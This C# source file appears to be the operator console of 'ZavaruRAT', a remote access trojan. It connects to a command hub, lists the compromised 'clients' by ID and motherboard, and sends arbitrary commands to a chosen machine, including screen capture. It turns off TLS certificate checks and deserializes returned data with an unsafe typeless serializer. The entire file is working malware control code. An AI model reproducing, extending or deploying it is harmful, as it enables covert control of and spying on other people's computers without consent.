#region

using System.Text;
using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using Grpc.Net.Client;
using MessagePack;
using ZavaruRAT.Admin.CommandHandlers;
using ZavaruRAT.Proto;

#endregion

Console.OutputEncoding = Encoding.UTF8;

var httpHandler = new HttpClientHandler();
httpHandler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
var channel = GrpcChannel.ForAddress("https://127.0.0.1:13442", new GrpcChannelOptions
{
    Credentials = ChannelCredentials.SecureSsl,
    HttpHandler = httpHandler
});
var adminClient = new AdminHub.AdminHubClient(channel);

var commandHandlers = new List<CommandHandler>
{
    new ScreenCapture(adminClient)
};

async Task ExecuteClientCommand()
{
start:

    Console.Clear();

    var stats = await adminClient.NetworkStatisticsAsync(new Empty());
    Console.WriteLine($"Nodes: {stats.Nodes}, clients: {stats.Clients}");
    Console.WriteLine();

    foreach (var node in stats.NodesList)
    {
        Console.WriteLine($"• {node.Id}");

        foreach (var client in node.Clients)
        {
            Console.WriteLine($"  ◦ {client.ClientId} ({client.Motherboard})");
        }

        Console.WriteLine();
    }

    // wait until someone connects
    if (stats.Clients == 0)
    {
        Console.WriteLine("No clients online");

        await Task.Delay(2500);
        return;
    }

    string clientId;
    while (true)
    {
        Console.Write("Client ID > ");
        clientId = Console.ReadLine()!;

        if (clientId == "@")
        {
            return;
        }

        if (!Guid.TryParse(clientId, out _))
        {
            continue;
        }

        var clientExists = await adminClient.ClientExistsAsync(new ClientExistsRequest
        {
            ClientId = clientId
        });

        if (!clientExists.Exists)
        {
            Console.WriteLine("Client not found");
            Console.WriteLine();

            continue;
        }

        break;
    }

    Console.Write("Command   > ");
    var command = Console.ReadLine()!;

    switch (command)
    {
        // wrong client
        case "-":
            goto start;
        // go homie
        case "@":
            return;
    }

    Console.WriteLine();

    var split = command.Split(' ', StringSplitOptions.TrimEntries | StringSplitOptions.RemoveEmptyEntries);
    var cmd = split[0];
    var args = split.Length > 1 ? split[1..] : Array.Empty<string>();

    var hashId = Guid.NewGuid().ToString();
    var results = adminClient.CommandResults(new CommandResultsRequest
    {
        HashId = hashId
    });

    await adminClient.InvokeCommandAsync(new InvokeCommandRequest
    {
        ClientId = clientId,
        HashId = hashId,
        Command = cmd,
        Arguments =
        {
            args
        }
    });

    Console.WriteLine("Waiting for {0} result", hashId);


    var handled = false;
    foreach (var handler in commandHandlers)
    {
        if (handler.Match(command.ToLower()))
        {
            await handler.Handle(hashId, clientId, results);
            handled = true;
            break;
        }
    }

    if (handled)
    {
        Console.WriteLine();
        Console.WriteLine();
        Console.WriteLine("Press <ENTER> to continue");

        Console.ReadLine();

        return;
    }

    await foreach (var commandResult in results.ResponseStream.ReadAllAsync())
    {
        Console.WriteLine();
        Console.WriteLine();
        Console.WriteLine(commandResult);

        try
        {
            var obj = MessagePackSerializer.Typeless.Deserialize(commandResult.Result.ToByteArray());
            Console.WriteLine(obj);
        }
        catch (Exception e)
        {
            Console.WriteLine("Unable to deserialize result");
            Console.WriteLine(e);
        }

        results.Dispose();

        break;
    }

    Console.WriteLine();
    Console.WriteLine();
    Console.WriteLine("Press <ENTER> to continue.");

    Console.ReadLine();
}

while (true)
{
    Console.Clear();

    Console.WriteLine("ZavaruRAT Admin");
    Console.WriteLine("===============");
    Console.WriteLine();
    Console.WriteLine("1. Execute command on a specified client");
    Console.WriteLine("2. Exit");
    Console.WriteLine();

    var key = Console.ReadKey(true);

    switch (key.Key)
    {
        case ConsoleKey.D1:
            await ExecuteClientCommand();
            break;
        case ConsoleKey.D2:
            Environment.Exit(0);
            return;
    }

    await Task.Delay(1000);
}
